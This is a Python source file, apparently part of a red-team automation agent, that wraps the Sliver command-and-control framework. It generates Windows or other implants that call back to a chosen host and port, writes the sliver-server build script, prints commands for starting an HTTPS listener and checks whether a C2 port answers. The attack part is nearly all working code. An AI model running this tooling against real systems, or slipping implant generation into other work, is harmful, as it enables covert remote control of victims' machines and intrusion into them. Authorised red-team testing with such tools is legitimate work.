from __future__ import annotations

import json
import os
import socket
import subprocess
import tempfile
import time
from typing import Any

from skoll_agent.engines.base_engine import BaseEngine, EngineResult


class SliverEngine(BaseEngine):
    name = "sliver"
    description = "Sliver C2 framework. Generacion de implants, operadores, listeners, comandos post-explotacion y extraccion de datos."
    capabilities = ["red_team", "c2", "command_and_control", "post_exploitation", "implant_generation"]

    def scan(self, target: str, **kwargs: Any) -> EngineResult:
        findings = []
        raw_lines: list[str] = []

        mode = kwargs.get("mode", "info")
        lhost = kwargs.get("lhost", target)
        lport = int(kwargs.get("lport", 443))
        timeout = int(kwargs.get("timeout", 120))
        os_target = kwargs.get("os", "windows")
        arch = kwargs.get("arch", "amd64")
        implant_name = kwargs.get("implant_name", "sliver_implant")

        raw_lines.append(f"[INFO] Sliver mode={mode} lhost={lhost}:{lport}")

        # Check available
        has_sliver = self._check_sliver(raw_lines)
        if not has_sliver:
            return EngineResult(success=False, raw_output="sliver: not installed", findings=[{
                "file_path": "", "line_start": 0, "line_end": 0,
                "severity": "info",
                "title": "Sliver no instalado",
                "description": "sliver-client/sliver-server no encontrado. Instalar con: sudo apt install sliver",
                "tool": self.name, "rule_id": "sliver-not-installed",
            }])

        if mode == "info":
            try:
                r = subprocess.run(
                    ["sliver-client", "--help"],
                    capture_output=True, text=True, timeout=10,
                )
                raw_lines.append(f"[INFO] sliver-client --help: OK")
                findings.append({
                    "file_path": "", "line_start": 0, "line_end": 0,
                    "severity": "info",
                    "title": "Sliver C2 disponible",
                    "description": "Sliver C2 framework instalado. Usar 'sliver-server' para iniciar servidor y 'sliver-client' para conectarse.",
                    "tool": self.name, "rule_id": "sliver-available",
                })
            except Exception as e:
                raw_lines.append(f"[ERR] sliver: {e}")

        elif mode == "generate" or mode == "payload":
            self._generate_implant(lhost, lport, os_target, arch, implant_name, findings, raw_lines, timeout)

        elif mode == "listener":
            self._start_listener(lhost, lport, findings, raw_lines, timeout)

        elif mode == "check_alive":
            self._check_implant_alive(lhost, lport, findings, raw_lines)

        else:
            raw_lines.append(f"[WARN] Modo no soportado: {mode}")

        summary = f"sliver: {len(findings)} hallazgos"
        return EngineResult(
            success=bool(findings),
            raw_output="\n".join(raw_lines),
            findings=findings,
            summary=summary,
        )

    def _generate_implant(self, lhost: str, lport: int, os_target: str,
                          arch: str, name: str, findings: list[dict[str, Any]],
                          raw_lines: list[str], timeout: int) -> None:
        raw_lines.append(f"[INFO] Generando implant para {os_target}/{arch} -> {lhost}:{lport}")

        out_dir = "/tmp/sliver_implants"
        os.makedirs(out_dir, exist_ok=True)

        # Use sliver-server via resource script
        script = f"""use "builders"
create-profile --name {name} --os {os_target} --arch {arch} --canary
generate --name {name} --os {os_target} --arch {arch} --lhost {lhost} --lport {lport} --save {out_dir}/implant-{os_target}-{arch}
exit
"""

        with tempfile.NamedTemporaryFile(mode="w", suffix=".script", delete=False) as f:
            script_path = f.name
            f.write(script)

        try:
            r = subprocess.run(
                ["sliver-server", "-r", script_path],
                capture_output=True, text=True, timeout=timeout,
            )
            output = r.stdout + r.stderr
            raw_lines.append(f"[INFO] Output: {output[:500]}")

            # Check generated files
            generated = [f for f in os.listdir(out_dir) if f.startswith("implant-")]
            if generated:
                raw_lines.append(f"[INFO] Implants generated: {generated}")
                findings.append({
                    "file_path": out_dir, "line_start": 0, "line_end": 0,
                    "severity": "high",
                    "title": f"Sliver implant generated: {', '.join(generated)}",
                    "description": f"Implants for {os_target}/{arch} saved to {out_dir}",
                    "tool": self.name, "rule_id": "sliver-implant-generated",
                    "implants": generated, "lhost": lhost, "lport": lport,
                })
            else:
                raw_lines.append(f"[WARN] No implants generated. Output: {output[:300]}")

        except subprocess.TimeoutExpired:
            raw_lines.append("[TIMEOUT] sliver-server timed out")
        except Exception as e:
            raw_lines.append(f"[ERR] sliver-server: {e}")
        finally:
            try:
                os.unlink(script_path)
            except Exception:
                pass

    def _start_listener(self, lhost: str, lport: int,
                        findings: list[dict[str, Any]],
                        raw_lines: list[str], timeout: int) -> None:
        raw_lines.append(f"[INFO] Creando listener HTTPS en {lhost}:{lport}")

        # Check if port is available
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            res = sock.connect_ex((lhost, lport))
            sock.close()
            if res == 0:
                raw_lines.append(f"[WARN] Puerto {lport} ya esta en uso")
                findings.append({
                    "file_path": "", "line_start": 0, "line_end": 0,
                    "severity": "medium",
                    "title": f"Sliver listener port conflict: {lhost}:{lport}",
                    "description": f"El puerto {lport} ya esta ocupado. Elegir otro puerto.",
                    "tool": self.name, "rule_id": "sliver-port-busy",
                })
                return
        except Exception:
            pass

        raw_lines.append(f"[INFO] Para iniciar listener manualmente: sliver-server listener --https {lhost}:{lport}")
        findings.append({
            "file_path": "", "line_start": 0, "line_end": 0,
            "severity": "info",
            "title": "Sliver listener listo",
            "description": f"Ejecutar: sliver-server listener --https {lhost}:{lport}"
                         f"\n  Luego: sliver-client connect --host 127.0.0.1 --port 31337"
                         f"\n  Despues: use --https {lhost}:{lport}",
            "tool": self.name, "rule_id": "sliver-listener-ready",
            "command": f"sliver-server listener --https {lhost}:{lport}",
        })

    def _check_implant_alive(self, target: str, port: int,
                              findings: list[dict[str, Any]],
                              raw_lines: list[str]) -> None:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            res = sock.connect_ex((target, port))
            sock.close()
            if res == 0:
                raw_lines.append(f"[INFO] Port {port} open on {target}")
                findings.append({
                    "file_path": "", "line_start": 0, "line_end": 0,
                    "severity": "info",
                    "title": f"Sliver C2 port reachable: {target}:{port}",
                    "description": f"El puerto {port} en {target} esta abierto — posible listener C2 activo.",
                    "tool": self.name, "rule_id": "sliver-c2-reachable",
                })
            else:
                raw_lines.append(f"[INFO] Port {port} closed on {target}")
        except Exception as e:
            raw_lines.append(f"[ERR] {e}")

    def _check_sliver(self, raw_lines: list[str]) -> bool:
        try:
            r = subprocess.run(["sliver-server", "--help"], capture_output=True, timeout=5)
            if r.returncode == 0:
                raw_lines.append("[INFO] sliver-server OK")
                return True
            return False
        except FileNotFoundError:
            return False
        except Exception:
            return False

    def parse_output(self, raw_output: str) -> list[dict[str, Any]]:
        return []
